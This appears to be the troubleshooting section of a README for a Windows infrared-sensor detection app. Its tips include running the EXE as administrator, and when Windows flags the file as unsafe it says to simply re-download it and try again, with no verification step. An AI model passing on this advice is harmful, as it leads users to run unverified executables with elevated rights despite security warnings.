## 📶 Detection Tips

Infrared readings can change based on the room and sensor setup. Use these tips for cleaner results:

- Test at night or in low light when possible

- Do not block the sensor lens
- Hold the device still during scans

- Use a fresh USB port if your sensor disconnects

## ❓ Troubleshooting

### The app does not open

- Right-click the EXE file and choose Run as administrator
- Check if Windows SmartScreen blocked it
- Make sure you extracted the ZIP file first
- Try downloading the file again

### The app opens, but no signal appears

- Check that the sensor is connected
- Move the sensor closer to the target area
- Test in a darker area
- Try a different USB port
- Restart the app and scan again

### Windows says the file is unsafe

- Confirm you downloaded it from the project page
- Use the same link shown above
- If the file is still blocked, re-download it and extract it again

### The sensor is not detected

- Unplug the sensor and plug it back in
- Close other apps that may use the same device
- Restart Windows and try again
- Test the sensor in another USB port
